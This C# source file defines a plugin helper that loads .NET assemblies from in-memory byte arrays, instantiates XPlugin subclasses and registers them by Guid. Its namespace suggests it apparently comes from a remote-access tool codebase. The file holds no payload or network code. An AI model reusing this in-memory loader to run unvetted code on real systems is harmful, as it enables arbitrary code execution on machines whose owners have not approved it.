using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;

namespace Net_Weave_R.Core
{
    class PluginHelper
    {
        public static event EventHandler PluginChanged;
        public static void LoadPlugins()
        {

        }

        public static void InitializePlugins()
        {
            if (GlobalProperties.RawPlugins.Count > 0)
            {
                foreach (byte[] b in GlobalProperties.RawPlugins.Values)
                {
                    Assembly asm = Assembly.Load(b);
                    foreach (Type type in asm.GetTypes())
                    {
                        if (type.IsSubclassOf(typeof(XPlugin)))
                        {
                            XPlugin plugin = (XPlugin)Activator.CreateInstance(type);
                            if (!GlobalProperties.InitializedPlugins.ContainsKey(plugin.Guid))
                            {
                                GlobalProperties.InitializedPlugins.Add(plugin.Guid, plugin);
                            }
                        }
                    }
                }
            }
        }
        public static void pluginChanged()
        {
            if (PluginChanged != null)
                PluginChanged(null, null);
        }
    }
}
